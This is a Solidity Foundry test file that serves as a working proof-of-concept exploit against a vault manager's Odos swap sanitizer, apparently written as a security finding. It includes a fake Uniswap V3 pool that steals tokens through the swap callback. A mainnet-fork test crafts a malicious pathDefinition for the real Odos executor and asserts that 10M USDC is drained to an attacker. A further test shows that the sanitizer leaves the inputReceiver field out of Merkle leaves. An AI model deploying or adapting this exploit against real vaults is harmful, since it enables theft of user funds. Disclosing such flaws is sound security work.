// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test, console} from "@forge-std/Test.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "@solmate/utils/SafeTransferLib.sol";
import {BoringVault} from "src/base/BoringVault.sol";
import {ManagerWithMerkleVerification} from "src/base/Roles/ManagerWithMerkleVerification.sol";
import {OdosDecoderAndSanitizer} from
    "src/base/DecodersAndSanitizers/Protocols/OdosDecoderAndSanitizer.sol";
import {BaseDecoderAndSanitizer} from "src/base/DecodersAndSanitizers/BaseDecoderAndSanitizer.sol";
import {DecoderCustomTypes} from "src/interfaces/DecoderCustomTypes.sol";
import {RolesAuthority, Authority} from "@solmate/auth/authorities/RolesAuthority.sol";
import {MerkleTreeHelper} from "test/resources/MerkleTreeHelper/MerkleTreeHelper.sol";

/// @notice Fake UniV3 pool that steals input tokens via the callback mechanism.
/// When the executor calls this pool's swap(), the pool:
/// 1. Calls back executor's uniswapV3SwapCallback requesting ALL input tokens
/// 2. Receives ALL input tokens from the executor
/// 3. Forwards ALL input tokens to the attacker (beneficiary)
/// 4. Sends 1 wei output token to the router (recipient) to satisfy outputMin
contract FakeUniV3Pool {
    using SafeTransferLib for ERC20;

    address public immutable token0; // USDC
    address public immutable token1; // WETH
    address public immutable beneficiary; // Attacker address

    constructor(address _token0, address _token1, address _beneficiary) {
        token0 = _token0;
        token1 = _token1;
        beneficiary = _beneficiary;
    }

    /// @notice Mimics IUniswapV3Pool.swap()
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160, /* sqrtPriceLimitX96 */
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        if (zeroForOne) {
            amount0 = amountSpecified;
            amount1 = -1;

            // Callback: executor transfers all input tokens to this pool
            bytes memory cbData = abi.encodeWithSelector(
                bytes4(0xfa461e33), // uniswapV3SwapCallback
                amount0, amount1, data
            );
            (bool success,) = msg.sender.call(cbData);
            require(success, "Callback failed");

            // Send 1 wei output to recipient (router)
            ERC20(token1).safeTransfer(recipient, 1);

            // Forward all stolen input tokens to the attacker
            uint256 stolen = ERC20(token0).balanceOf(address(this));
            if (stolen > 0) ERC20(token0).safeTransfer(beneficiary, stolen);
        } else {
            amount0 = -1;
            amount1 = amountSpecified;

            bytes memory cbData = abi.encodeWithSelector(
                bytes4(0xfa461e33), amount0, amount1, data
            );
            (bool success,) = msg.sender.call(cbData);
            require(success, "Callback failed");

            ERC20(token0).safeTransfer(recipient, 1);

            uint256 stolen = ERC20(token1).balanceOf(address(this));
            if (stolen > 0) ERC20(token1).safeTransfer(beneficiary, stolen);
        }
    }
}

/// @notice DAS for this test: Odos swap + BaseDecoderAndSanitizer
contract TestDAS is BaseDecoderAndSanitizer, OdosDecoderAndSanitizer {
    constructor(address _odosRouter) OdosDecoderAndSanitizer(_odosRouter) {}
}

/// @title Full End-to-End Exploit with REAL Odos V2 Executor
/// @notice Proves complete fund theft through:
///   Manager -> Vault -> Odos Router -> REAL Odos Executor -> FakePool -> Attacker
///
/// The executor at 0x365084B05Fa7d5028346bD21D842eD0601bAB5b8 is NOT mocked.
/// The pathDefinition is crafted with a fake pool address that the REAL executor
/// processes via its UniV3 swap handler (opcode 0x0d).
contract OdosExecutorTest is Test, MerkleTreeHelper {
    using SafeTransferLib for ERC20;

    ManagerWithMerkleVerification public manager;
    BoringVault public boringVault;
    address public das;
    RolesAuthority public rolesAuthority;

    address constant ODOS_ROUTER = 0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559;
    address constant ODOS_EXECUTOR = 0x365084B05Fa7d5028346bD21D842eD0601bAB5b8;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address constant UNIV3_USDC_WETH = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;

    uint8 public constant MANAGER_ROLE = 1;
    uint8 public constant STRATEGIST_ROLE = 2;
    uint8 public constant ADMIN_ROLE = 4;

    address ATTACKER;
    FakeUniV3Pool fakePool;

    function setUp() public {
        ATTACKER = makeAddr("attacker");

        setSourceChainName("mainnet");
        uint256 forkId = vm.createFork(vm.envString("MAINNET_RPC_URL"));
        vm.selectFork(forkId);

        // Deploy core contracts
        boringVault = new BoringVault(address(this), "Executor Test Vault", "ETV", 18);
        manager = new ManagerWithMerkleVerification(
            address(this), address(boringVault), address(0)
        );
        das = address(new TestDAS(ODOS_ROUTER));

        // Deploy fake pool: token0=USDC, token1=WETH, beneficiary=ATTACKER
        fakePool = new FakeUniV3Pool(USDC, WETH, ATTACKER);

        // Setup roles
        rolesAuthority = new RolesAuthority(address(this), Authority(address(0)));
        boringVault.setAuthority(rolesAuthority);
        manager.setAuthority(rolesAuthority);

        rolesAuthority.setRoleCapability(
            MANAGER_ROLE,
            address(boringVault),
            bytes4(keccak256("manage(address,bytes,uint256)")),
            true
        );
        rolesAuthority.setRoleCapability(
            STRATEGIST_ROLE,
            address(manager),
            ManagerWithMerkleVerification.manageVaultWithMerkleVerification.selector,
            true
        );
        rolesAuthority.setRoleCapability(
            ADMIN_ROLE,
            address(manager),
            ManagerWithMerkleVerification.setManageRoot.selector,
            true
        );

        rolesAuthority.setUserRole(address(this), STRATEGIST_ROLE, true);
        rolesAuthority.setUserRole(address(this), ADMIN_ROLE, true);
        rolesAuthority.setUserRole(address(manager), MANAGER_ROLE, true);

        setAddress(false, "mainnet", "boringVault", address(boringVault));
        setAddress(false, "mainnet", "rawDataDecoderAndSanitizer", das);
        setAddress(false, "mainnet", "manager", address(manager));
        setAddress(false, "mainnet", "managerAddress", address(manager));
        setAddress(false, "mainnet", "accountantAddress", address(1));
    }

    /// @notice Craft pathDefinition with arbitrary pool address.
    /// Format matches the real executor's parser (verified by testPathDefinitionFormat).
    function _buildPathDefinition(address pool) internal pure returns (bytes memory) {
        bytes memory word0 = new bytes(32);
        word0[0] = 0x01; // numOutputs
        word0[1] = 0x02; // numAmountSlots
        word0[2] = 0x03; // numAddresses (router + pool + inputToken)
        word0[3] = 0x00; // amount from slot 0
        word0[4] = 0x0d; // opcode: UniV3 swap
        word0[5] = 0x01; // recipient = addresses[1] -> but actually output goes to addresses[0]=router
        word0[6] = 0x01; // pool = addresses[1]
        word0[7] = 0x01; // pool index for callback
        word0[8] = 0x02; // inputToken = addresses[2]
        word0[9] = 0x01; // zeroForOne = true (USDC -> WETH)
        word0[10] = 0xff; // STOP

        bytes memory addrBlock = new bytes(64);
        bytes20 poolBytes = bytes20(pool);
        bytes20 usdcBytes = bytes20(USDC);
        for (uint256 i = 0; i < 20; i++) {
            addrBlock[i] = poolBytes[i];
            addrBlock[20 + i] = usdcBytes[i];
        }

        return abi.encodePacked(word0, addrBlock);
    }

    /// @notice Verify our pathDefinition builder matches the known working format.
    function testPathDefinitionFormat() public pure {
        bytes memory known = hex"010203000d0101010201ff00000000000000000000000000000000000000000088e6a0c2ddd26feeb64f039a2c41296fcb3f5640a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000";
        bytes memory built = _buildPathDefinition(UNIV3_USDC_WETH);
        assertEq(built, known, "Built pathDefinition should match known working example");
    }

    /// @notice FULL END-TO-END EXPLOIT: 10M USDC stolen using REAL executor.
    function testRealExecutorWithFakePool() public {
        uint256 VAULT_USDC = 10_000_000e6;

        deal(USDC, address(boringVault), VAULT_USDC);
        deal(WETH, address(fakePool), 1); // 1 wei WETH for minimal output

        (ManageLeaf[] memory leafs, bytes32[][] memory manageTree) = _buildMerkleTree();
        _executeApproval(leafs, manageTree);
        _executeMaliciousSwapWithRealExecutor(leafs, manageTree, VAULT_USDC);
    }

    function _buildMerkleTree() internal returns (ManageLeaf[] memory leafs, bytes32[][] memory manageTree) {
        address[] memory tokens = new address[](2);
        SwapKind[] memory kind = new SwapKind[](2);
        tokens[0] = USDC;
        kind[0] = SwapKind.BuyAndSell;
        tokens[1] = WETH;
        kind[1] = SwapKind.BuyAndSell;

        leafs = new ManageLeaf[](16);
        _addOdosSwapLeafs(leafs, tokens, kind);

        manageTree = _generateMerkleTree(leafs);
        manager.setManageRoot(address(this), manageTree[manageTree.length - 1][0]);
    }

    function _executeApproval(ManageLeaf[] memory leafs, bytes32[][] memory manageTree) internal {
        ManageLeaf[] memory approveLeafs = new ManageLeaf[](1);
        approveLeafs[0] = leafs[0];
        bytes32[][] memory proofs = _getProofsUsingTree(approveLeafs, manageTree);

        address[] memory targets = new address[](1);
        targets[0] = USDC;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", ODOS_ROUTER, type(uint256).max);
        address[] memory dasArr = new address[](1);
        dasArr[0] = das;
        uint256[] memory values = new uint256[](1);

        manager.manageVaultWithMerkleVerification(proofs, dasArr, targets, data, values);
    }

    function _executeMaliciousSwapWithRealExecutor(
        ManageLeaf[] memory leafs,
        bytes32[][] memory manageTree,
        uint256 vaultUsdc
    ) internal {
        uint256 attackerBefore = ERC20(USDC).balanceOf(ATTACKER);
        uint256 vaultWethBefore = ERC20(WETH).balanceOf(address(boringVault));

        console.log("=== BEFORE ATTACK ===");
        console.log("Vault USDC:", ERC20(USDC).balanceOf(address(boringVault)) / 1e6);
        console.log("Attacker USDC:", attackerBefore / 1e6);

        // Execute the swap
        ManageLeaf[] memory swapLeafs = new ManageLeaf[](1);
        swapLeafs[0] = leafs[1];
        bytes32[][] memory proofs = _getProofsUsingTree(swapLeafs, manageTree);

        address[] memory targets = new address[](1);
        targets[0] = ODOS_ROUTER;

        // Build malicious swap calldata with fake pool in pathDefinition
        DecoderCustomTypes.swapTokenInfo memory swapInfo = DecoderCustomTypes.swapTokenInfo({
            inputToken: USDC,
            inputAmount: vaultUsdc,
            inputReceiver: ODOS_EXECUTOR, // Normal flow - tokens go to executor
            outputToken: WETH,
            outputQuote: 1,
            outputMin: 1,
            outputReceiver: address(boringVault)
        });

        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature(
            "swap((address,uint256,address,address,uint256,uint256,address),bytes,address,uint32)",
            swapInfo,
            _buildPathDefinition(address(fakePool)), // FAKE POOL replaces real pool
            ODOS_EXECUTOR,
            uint32(0)
        );

        address[] memory dasArr = new address[](1);
        dasArr[0] = das;
        uint256[] memory values = new uint256[](1);

        manager.manageVaultWithMerkleVerification(proofs, dasArr, targets, data, values);

        // Verify theft
        uint256 attackerAfter = ERC20(USDC).balanceOf(ATTACKER);
        uint256 vaultUsdcAfter = ERC20(USDC).balanceOf(address(boringVault));
        uint256 vaultWethAfter = ERC20(WETH).balanceOf(address(boringVault));

        console.log("");
        console.log("=== AFTER ATTACK ===");
        console.log("Vault USDC:", vaultUsdcAfter / 1e6);
        console.log("Attacker USDC:", attackerAfter / 1e6);
        console.log("Vault WETH gained (wei):", vaultWethAfter - vaultWethBefore);
        console.log("Stolen:", (attackerAfter - attackerBefore) / 1e6, "USDC");

        assertEq(attackerAfter, vaultUsdc, "Attacker should have all USDC");
        assertEq(vaultUsdcAfter, 0, "Vault should have 0 USDC");
        assertEq(vaultWethAfter - vaultWethBefore, 1, "Vault got only 1 wei WETH");
    }
}

contract OdosDASBypassTest is Test {
    address constant ODOS_ROUTER = 0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559;
    address constant ODOS_EXECUTOR = 0x365084B05Fa7d5028346bD21D842eD0601bAB5b8;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    OdosDecoderAndSanitizer das;

    function setUp() public {
        das = new OdosDecoderAndSanitizer(ODOS_ROUTER);
    }

    function testProof_InputReceiverNotInMerkleLeaf() public {
        address VAULT = makeAddr("vault");
        address ATTACKER = makeAddr("attacker");

        DecoderCustomTypes.swapTokenInfo memory legitimateSwap = DecoderCustomTypes.swapTokenInfo({
            inputToken: USDC,
            inputAmount: 1_000_000e6,
            inputReceiver: ODOS_EXECUTOR,
            outputToken: WETH,
            outputQuote: 400e18,
            outputMin: 390e18,
            outputReceiver: VAULT
        });

        DecoderCustomTypes.swapTokenInfo memory maliciousSwap = DecoderCustomTypes.swapTokenInfo({
            inputToken: USDC,
            inputAmount: 1_000_000e6,
            inputReceiver: ATTACKER,
            outputToken: WETH,
            outputQuote: 1,
            outputMin: 1,
            outputReceiver: VAULT
        });

        bytes memory legit = das.swap(legitimateSwap, "", ODOS_EXECUTOR, 0);
        bytes memory malicious = das.swap(maliciousSwap, "", ODOS_EXECUTOR, 0);

        // DAS returns IDENTICAL addresses for both swaps
        assertEq(legit, malicious);
        assertEq(legit.length, 80, "4 addresses * 20 bytes each");

        // Merkle leaves are IDENTICAL
        bytes4 selector = OdosDecoderAndSanitizer.swap.selector;
        bytes32 legitLeaf = keccak256(abi.encodePacked(address(das), ODOS_ROUTER, false, selector, legit));
        bytes32 maliciousLeaf = keccak256(abi.encodePacked(address(das), ODOS_ROUTER, false, selector, malicious));
        assertEq(legitLeaf, maliciousLeaf, "Merkle leaves MUST be identical");
    }
}
